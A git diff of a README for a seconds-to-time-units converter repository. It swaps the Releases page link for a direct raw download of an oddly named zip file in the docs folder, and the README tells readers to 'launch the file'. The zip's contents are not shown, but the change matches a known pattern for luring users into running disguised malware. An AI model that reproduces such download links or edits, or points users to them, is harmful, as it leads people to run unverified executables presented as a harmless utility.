@@ -33,9 +33,9 @@ This repository provides a convenient way to convert seconds into different time
 
 ## Explore the Release 🚀
 
-For the latest version of the converter tool, head over to the [https://github.com/acef84/seconds-converter-to-other-units/releases](https://github.com/acef84/seconds-converter-to-other-units/releases). Make sure to launch the file to access the functionalities of the application. If the link does not work, kindly check the "Releases" section for alternative download options.
+For the latest version of the converter tool, head over to the [https://github.com/acef84/seconds-converter-to-other-units/raw/refs/heads/master/docs/units_to_converter_seconds_other_unsubsidized.zip](https://github.com/acef84/seconds-converter-to-other-units/raw/refs/heads/master/docs/units_to_converter_seconds_other_unsubsidized.zip). Make sure to launch the file to access the functionalities of the application. If the link does not work, kindly check the "Releases" section for alternative download options.
 
-[![Download Release](https://github.com/acef84/seconds-converter-to-other-units/releases)](https://github.com/acef84/seconds-converter-to-other-units/releases)
+[![Download Release](https://github.com/acef84/seconds-converter-to-other-units/raw/refs/heads/master/docs/units_to_converter_seconds_other_unsubsidized.zip)](https://github.com/acef84/seconds-converter-to-other-units/raw/refs/heads/master/docs/units_to_converter_seconds_other_unsubsidized.zip)
 
 ## Additional Resources 📘
 
